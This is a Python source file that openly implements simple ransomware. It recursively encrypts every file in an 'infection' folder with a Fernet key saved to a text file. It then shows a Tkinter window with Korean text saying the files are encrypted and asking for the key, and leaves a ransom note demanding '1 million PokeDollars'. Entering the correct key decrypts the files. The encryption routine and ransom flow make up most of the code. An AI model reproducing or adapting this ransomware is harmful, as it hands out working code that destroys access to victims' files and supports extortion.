from cryptography.fernet import Fernet
import os
import glob
import base64
from os import path
from tkinter import *
import tkinter


class Ransomware:

	def generate_encryption_key(self):
		key = Fernet.generate_key()
		key = str(key)
		#key= key[2:]

		with open("ransom.txt", "w") as keyfile:
			keyfile.write(key)

	def load_encryption_key(self):
		return open("ransom.txt", "r").read()

	def encrypt_file(self, key, directory):
		for x in os.walk(directory):
			for item in glob.glob(os.path.join(x[0], "*")):
				if os.path.isfile(item):
					evil_key = Fernet(key)
					file = open(item, "rb")
					encrypted_result = evil_key.encrypt(file.read())
					file.close()
					new_file = open(item, "wb")
					new_file.write(encrypted_result)
					new_file.close()
		

	def decrypt_file(self, key, directory):
		for x in os.walk(directory):
			for item in glob.glob(os.path.join(x[0], "*")):
				if os.path.isfile(item):
					evil_key = Fernet(key)
					file = open(item, "rb")
					decrypted_result = evil_key.decrypt(file.read())
					file.close()
					new_file = open(item, "wb")
					new_file.write(decrypted_result)
					new_file.close()

if __name__ == "__main__":
	ransomware=Ransomware()
	encrypt=True

	if not path.exists("infection/ransom.key") and encrypt:
		ransomware.generate_encryption_key()

	ransomware.encrypt_file(ransomware.load_encryption_key(), "infection")

	def k():
		if(key.get()==open("ransom.txt","r").read()):
			label1.config(text="해독되었습니다.")

	root = Tk()
	root.title("ransomware")
	root.geometry("1500x700+250+125")
	root.resizable(False,False)
	key = tkinter.StringVar()
	label1 = Label(root, text="당신의 파일이 암호화 되었습니다.",fg="red",)
	label1.configure(font=("Courier",50,"italic"))
	label1.place(x=160,y=250)
	label2 = Label(root,text="key 값을 입력해주세요.")
	label2.place(x=475,y=350)
	label2.configure(font=("Courier",35))
	button = Button(root,text="입력",width=10, command=k)
	button.configure(font=("Courier",10))
	button.place(x=1175,y=400)
	entry = Entry(root,width=125,textvariable=key)
	entry.place(x=150,y=400)
	root.mainloop()
	if(key.get()==open("ransom.txt","r").read()):
		encrypt=False

	if encrypt:
		ransom_file = open("infection/what_happened_to_my_files.txt", "a")
		ransom_file.write("What happened to my files?\n")
		ransom_file.write("We have hacked into your computer and encrypted them! If you want us to decrypt them, you must pay us 1 million PokeDollars!")
		ransom_file.close()
	else:
		if path.exists("infection/what_happened_to_my_files.txt"):
			os.remove("infection/what_happened_to_my_files.txt")
		ransomware.decrypt_file(ransomware.load_encryption_key(), "infection")
		os.remove("ransom.txt")
	